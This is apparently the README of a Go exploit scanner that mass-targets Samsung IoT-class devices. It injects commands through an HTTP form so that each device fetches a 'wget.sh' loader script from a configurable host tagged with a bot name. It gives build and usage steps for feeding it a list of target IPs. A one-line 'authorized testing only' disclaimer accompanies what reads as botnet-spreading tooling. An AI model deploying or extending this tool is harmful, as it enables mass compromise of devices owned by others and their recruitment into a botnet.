# samsung

Minimal Go worker pool: HTTP form injection on Samsung IoT–class endpoints, writes attacker-controlled content via `shell:` piped to `dd`.

## File

- `samsung.go`

## Configuration

Edit the `payload` constant — replace `http://asdf/wget.sh` with your lab host and bot tag `samsung`.

## Usage

```bash
go build -o samsung samsung.go
cat ips.txt | ./samsung
```

Targets read from **stdin** (one host per line).

## Disclaimer

Authorized device testing only.
